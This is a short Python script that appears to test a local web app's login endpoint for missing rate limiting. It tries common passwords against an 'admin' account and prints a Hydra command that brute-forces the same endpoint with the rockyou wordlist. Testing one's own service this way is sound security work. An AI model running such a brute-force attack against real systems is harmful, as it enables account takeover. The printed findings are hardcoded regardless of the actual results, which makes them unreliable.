"""
Brute Force Login Attack
=========================
Tests lack of rate limiting on login endpoint
"""

import requests
import time

BASE_URL = "http://localhost:8080"

def test_brute_force():
    print("\n" + "="*50)
    print("BRUTE FORCE LOGIN ATTACK")
    print("="*50)
    
    # Common passwords to try
    passwords = [
        "password", "123456", "admin", "root", "password123",
        "letmein", "welcome", "monkey", "dragon", "master",
        "qwerty", "login", "admin123", "abc123", "password1"
    ]
    
    username = "admin"
    attempts = 0
    start_time = time.time()
    
    print(f"\n[*] Target: {BASE_URL}/api/login")
    print(f"[*] Username: {username}")
    print(f"[*] Testing {len(passwords)} passwords...")
    print("-" * 40)
    
    for password in passwords:
        attempts += 1
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/login",
                json={"username": username, "password": password}
            )
            
            if response.status_code == 200:
                elapsed = time.time() - start_time
                print(f"\n[SUCCESS] Password found: '{password}'")
                print(f"[*] Attempts: {attempts}")
                print(f"[*] Time: {elapsed:.2f} seconds")
                print(f"[*] Token: {response.json()['access_token'][:50]}...")
                break
            else:
                # Check if we're being rate limited
                if response.status_code == 429:
                    print(f"[BLOCKED] Rate limit hit after {attempts} attempts")
                    break
                else:
                    print(f"[-] '{password}' - failed")
                    
        except Exception as e:
            print(f"[ERROR] {str(e)}")
    
    else:
        print(f"\n[-] Password not in wordlist")
    
    print("\n" + "="*50)
    print("FINDINGS:")
    print(f"- No rate limiting detected after {attempts} attempts")
    print("- Weak password 'password123' was cracked")
    print("- Error messages reveal if username exists")
    print("="*50)
    
    print("\n[*] KALI LINUX COMMAND:")
    print("hydra -l admin -P /usr/share/wordlists/rockyou.txt \\")
    print("  localhost -s 8080 http-post-form \\")
    print('  "/api/login:{\\"username\\":\\"^USER^\\",\\"password\\":\\"^PASS^\\"}:Invalid"')

if __name__ == "__main__":
    test_brute_force()
